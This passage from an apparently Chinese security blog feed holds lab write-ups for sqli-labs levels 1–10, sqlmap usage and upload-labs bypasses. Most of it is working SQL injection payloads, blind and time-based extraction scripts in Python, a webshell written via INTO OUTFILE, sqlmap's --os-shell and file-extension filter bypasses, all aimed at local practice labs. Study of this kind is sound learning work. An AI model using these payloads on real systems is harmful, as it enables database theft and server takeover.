?<span class="hljs-number">1</span>=echo \)\; &gt;&gt;<span class="hljs-number">1</span> 
?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre></div>

<p>之后访问1.php提交参数，获取想要的内容。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>sql_labs</title>
    <url>/2021/01/30/sql-labs/</url>
    <content><![CDATA[<p>寒假在家没事做，给自己找点事做，想来想去还是做一些漏洞实验吧</p>
<a id="more"></a>

<p>搭建好环境后就可以开始做题了</p>
<h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>get提交参数id</p>
<p>首先提交<code>1&#39;</code>，判断是字符型还是数字型注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223925654.png" srcset="/img/loading.gif" alt="image-20210130223925654"></p>
<p>这里出现报错，说明是字符类型的，并且是用<code>&#39;</code>将参数id包裹起来的。</p>
<p>接下来就是判断列数，爆表名，爆列名和数据库内容</p>
<h2 id="0x1-确定列数并爆出表名"><a href="#0x1-确定列数并爆出表名" class="headerlink" title="0x1 确定列数并爆出表名"></a>0x1 确定列数并爆出表名</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213104147.png" srcset="/img/loading.gif" alt="image-20210130213104147"></p>
<p>当列数增加到4的时候开始报错，说明是三列</p>
<div class="hljs"><pre><code class="hljs sql">?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+</span></code></pre></div>

<p><img src="https://i.loli.net/2021/01/30/KtISlB9Wd4mreqF.png" srcset="/img/loading.gif" alt="image-20210130213358017.png"></p>
<h2 id="0x2-爆列名"><a href="#0x2-爆列名" class="headerlink" title="0x2 爆列名"></a>0x2 爆列名</h2><div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span>--+</code></pre></div>

<p>这里的列名很多</p>
<div class="hljs"><pre><code class="hljs pgsql">user_id,first_name,last_name,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>,avatar,last_login,failed_login</code></pre></div>

<h2 id="0x3-爆出内容"><a href="#0x3-爆出内容" class="headerlink" title="0x3 爆出内容"></a>0x3 爆出内容</h2><p>选择password</p>
<div class="hljs"><pre><code class="hljs sql">?id=-1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span><span class="hljs-comment">--+</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213751401.png" srcset="/img/loading.gif" alt="image-20210130213751401"></p>
<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>同样使用 <code>id=1&#39;</code>，判断是什么类型的注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214135139.png" srcset="/img/loading.gif" alt="image-20210130214135139"></p>
<p>可以发现输入的<code>&#39;</code>没有其他的<code>&#39;</code>与之闭合，导致报错，所以这是数字型注入</p>
<p>所以可以直接使用level1的注入语句，只需要删除 ‘ 即可</p>
<div class="hljs"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'users'</span><span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span></code></pre></div>



<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>提交<code>id=1&#39;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214628110.png" srcset="/img/loading.gif" alt="image-20210130214628110"></p>
<p>分析一下报错原因</p>
<p>出错的语句为</p>
<div class="hljs"><pre><code class="hljs lsl">'<span class="hljs-number">1</span>'') LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></div>

<p>其中<strong style="color:orange;">1’</strong>输入的内容，所以包裹参数的格式为<code>(&#39;id&#39;)</code></p>
<p>注入语句可以直接在level1的基础上增加一个 )即可</p>
<p>将原语句修改为</p>
<div class="hljs"><pre><code class="hljs lsl">'<span class="hljs-number">1</span>') 注入语句 --+ ') LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></div>



<div class="hljs"><pre><code class="hljs sql">?id=-1') union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+ </span>

?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span><span class="hljs-keyword">users</span><span class="hljs-string">'--+ </span>
<span class="hljs-string"></span>
<span class="hljs-string">?id=-1'</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span><span class="hljs-comment">--+</span></code></pre></div>



<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>同样输入<code>id=1&#39;</code>，但是这次没有报错，才是是使用了<code>&quot;</code>，换成<code>id=1&quot;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130215456338.png" srcset="/img/loading.gif" alt="image-20210130215456338"></p>
<p>很明显和level3基本相同，将<code>&#39;</code>改为<code>&quot;</code>，就是这关的答案</p>
<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p>这题是字符型注入，但是不在回显所查询的内容，所以是盲注</p>
<p>查看源码也可以发现</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130220440238.png" srcset="/img/loading.gif" alt="image-20210130220440238" style="zoom:50%;">

<p>不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入</p>
<p><strong>报错注入</strong></p>
<p><span style="background-color:yellow"><strong>(1). 通过floor报错</strong></span></p>
<p>and (select 1 from (select count(<em>),concat((payload) from users limit 0,1),floor (rand(0)</em>2))x from information_schema.tables group by x)a)</p>
<p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p>
<p><span style="background-color:yellow"><strong>(2). 通过updatexml报错</strong></span></p>
<p>and updatexml(1,payload,1)</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p><span style="background-color:yellow"><strong>(3). 通过ExtractValue报错</strong></span></p>
<p>and extractvalue(1, payload)</p>
<p>输出字符有长度限制，最长32位。</p>
<h2 id="0x1-确定数据库名"><a href="#0x1-确定数据库名" class="headerlink" title="0x1 确定数据库名"></a>0x1 确定数据库名</h2><div class="hljs"><pre><code class="hljs lsl">?id=<span class="hljs-number">1</span>' and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x23</span>,database(),<span class="hljs-number">0x23</span>))--+</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130221306917.png" srcset="/img/loading.gif" alt="image-20210130221306917"></p>
<h2 id="0x2-爆表名"><a href="#0x2-爆表名" class="headerlink" title="0x2 爆表名"></a>0x2 爆表名</h2><div class="hljs"><pre><code class="hljs sql">?id=1' and extractvalue(1,concat(0x23,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x23</span>))<span class="hljs-comment">--+</span></code></pre></div>

<p>这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名</p>
<h2 id="0x3-爆列名"><a href="#0x3-爆列名" class="headerlink" title="0x3 爆列名"></a>0x3 爆列名</h2><div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1' <span class="hljs-keyword">and</span> extractvalue(1,concat(0x23,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span> limit 1,1),0x23))--+</code></pre></div>



<h2 id="0x4-爆内容"><a href="#0x4-爆内容" class="headerlink" title="0x4 爆内容"></a>0x4 爆内容</h2><div class="hljs"><pre><code class="hljs mysql">?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre></div>

<p>后面的内容可以通过改变limit后的第一个参数查看</p>
<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p>与level5很像</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223612822.png" srcset="/img/loading.gif" alt="image-20210130223612822"></p>
<p>但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可</p>
<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>提交id=1，出现提示</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131230645205.png" srcset="/img/loading.gif" alt="image-20210131230645205"></p>
<p>需要使用outfile函数</p>
<p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个</p>
<ul>
<li>into dumpfile()</li>
<li>into outfile()</li>
<li>load_file()</li>
</ul>
<p>这里我们利用outfile函数</p>
<p>首先确定这关包裹参数的格式</p>
<p>一直测试到<code>id=1&#39;)) --+</code>，才显示正确所以可以确定参数的包裹格式为<code>((&#39;id&#39;))</code></p>
<h2 id="0x1-向网站根目录写入一句话木马"><a href="#0x1-向网站根目录写入一句话木马" class="headerlink" title="0x1 向网站根目录写入一句话木马"></a>0x1 向网站根目录写入一句话木马</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233508732.png" srcset="/img/loading.gif" alt="image-20210131233508732"></p>
<p>执行后就可以在根目录中看到这个文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233433411.png" srcset="/img/loading.gif" alt="image-20210131233433411"></p>
<h2 id="0x2-使用蚁剑连接"><a href="#0x2-使用蚁剑连接" class="headerlink" title="0x2 使用蚁剑连接"></a>0x2 使用蚁剑连接</h2><div class="hljs"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">3</span>.php
密码:cmd</code></pre></div>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233415258.png" srcset="/img/loading.gif" alt="image-20210131233415258"></p>
<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>根据标题和测试结果可以看出是盲注</p>
<p>首先判断是什么类型注入</p>
<p>提交<code>id=1</code>，显示结果为<code>You are in</code>，可以确定成功查询返回的结果</p>
<p>提交<code>id=1&#39;</code>，没有提示<code>You are in</code>，但是提交<code>id=1&#39; --+</code>，再次出现<code>You are in</code>，可以确定是字符型注入，包裹形式为<code>&#39;id&#39;</code></p>
<p>接下来就是确定盲注使用的语句，这里可以使用 <code>ascii</code>和<code>substring</code>两个函数</p>
<h2 id="0x1-爆出数据库名"><a href="#0x1-爆出数据库名" class="headerlink" title="0x1 爆出数据库名"></a>0x1 爆出数据库名</h2><div class="hljs"><pre><code class="hljs lsl">?id=<span class="hljs-number">1</span>' and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>%<span class="hljs-number">23</span></code></pre></div>

<p>首先假设数据库名的第一个字母的ascii码值大于97，回显为<code>you are in</code>，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。</p>
<p>可以使用脚本完成该过程，脚本跑出的结果为  <strong style="color:red;">security</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201120357770.png" srcset="/img/loading.gif" alt="image-20210201120357770"></p>
<h2 id="0x2-爆出表名"><a href="#0x2-爆出表名" class="headerlink" title="0x2 爆出表名"></a>0x2 爆出表名</h2><p>使用注入语句</p>
<div class="hljs"><pre><code class="hljs sql">id=1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>

<p>最后爆出的表名如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png" srcset="/img/loading.gif" alt></p>
<h2 id="0x3-爆出列名"><a href="#0x3-爆出列名" class="headerlink" title="0x3 爆出列名"></a>0x3 爆出列名</h2><div class="hljs"><pre><code class="hljs sql">id=1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">'users'</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201140521465.png" srcset="/img/loading.gif" alt="image-20210201140521465"></p>
<h2 id="0x4-爆出内容"><a href="#0x4-爆出内容" class="headerlink" title="0x4 爆出内容"></a>0x4 爆出内容</h2><div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1' <span class="hljs-keyword">and</span> (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>having a&gt;&#123;1&#125;)%23</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201141626668.png" srcset="/img/loading.gif" alt="image-20210201141626668"></p>
<p>完整脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://127.0.0.1/sqli-labs/Less-8/?id="</span>

flag = <span class="hljs-string">""</span>
t = <span class="hljs-string">""</span>
sum=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
        <span class="hljs-comment"># payload = "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        <span class="hljs-comment"># payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='users' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">"You are in"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + chr(mid)
    print(flag)
print(flag)</code></pre></div>





<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p>题目标题提示了是基于时间且单引号闭合的盲注</p>
<p>基于时间的盲注需要使用到<code>sleep</code>函数，基本用法如下</p>
<p>分别提交<code>id=1</code>，<code>id=1&#39; and sleep(3) --+</code>，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213644564.png" srcset="/img/loading.gif" alt="image-20210201213644564"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213715695.png" srcset="/img/loading.gif" alt="image-20210201213715695"></p>
<p>注入脚本只需要改一改level8的即可。</p>
<p>完整脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">"http://127.0.0.1/sqli-labs/Less-9/?id="</span>

flag = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = "1' and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23".format(i,mid)</span>
        payload = <span class="hljs-string">"1' and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23"</span>.format(i,mid)
        <span class="hljs-comment"># payload = "1' and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='users' having a&gt;&#123;1&#125;),sleep(2),null)%23".format(i,mid)</span>
        <span class="hljs-comment"># payload = "1' and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23".format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + chr(mid)
    print(flag)
print(flag)</code></pre></div>



<p>爆破数据库名的过程如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201220840369.png" srcset="/img/loading.gif" alt="image-20210201220840369"></p>
<h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p>与level9基本相同，只需要将payload中的<code>&#39;</code>换成<code>&quot;</code>即可</p>
<p>完整脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">"http://127.0.0.1/sqli-labs/Less-9/?id="</span>

flag = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = "1" and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23".format(i,mid)</span>
        payload = <span class="hljs-string">"1"</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database() having a&gt;&#123;<span class="hljs-number">1</span>&#125;),sleep(<span class="hljs-number">2</span>),null)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span>
<span class="hljs-string">        # payload = "</span><span class="hljs-number">1</span><span class="hljs-string">" and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='users' having a&gt;&#123;1&#125;),sleep(2),null)%23"</span>.format(i,mid)
        <span class="hljs-comment"># payload = "1" and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23".format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + chr(mid)
    print(flag)
print(flag)</code></pre></div>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><a id="more"></a>

<p>第一步:</p>
<div class="hljs"><pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre></div><p>第二步:</p>
<div class="hljs"><pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre></div><p>第三步:</p>
<div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre></div><p>第四步:</p>
<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre></div><p>第五步:</p>
<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
//探测user表name和password字段</code></pre></div><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
<p>第六步:</p>
<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre></div><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
<p>group by *</p>
<p>利用内置函数暴数据库信息</p>
<p>version() 查看数据库版本</p>
<p>database() 查看当前数据库名</p>
<p>user() 查看当前用户</p>
<p>查看表：</p>
<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>可十六进制查看字段：</p>
<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre></div>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-11-21</title>
    <url>/2020/09/18/upload2/</url>
    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><a id="more"></a>

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>,<span class="hljs-string">"ini"</span>);

        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = str_ireplace($deny_ext,<span class="hljs-string">""</span>, $file_name);
        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;        
        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
            $is_upload = <span class="hljs-keyword">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'上传出错！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>]))&#123;
    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
    $file_ext = substr($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],strrpos($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;
        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        $img_path = $_GET[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.$file_ext;

        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;
            $is_upload = <span class="hljs-keyword">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'上传出错！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        $msg = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;
    &#125;
&#125;</code></pre></div>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
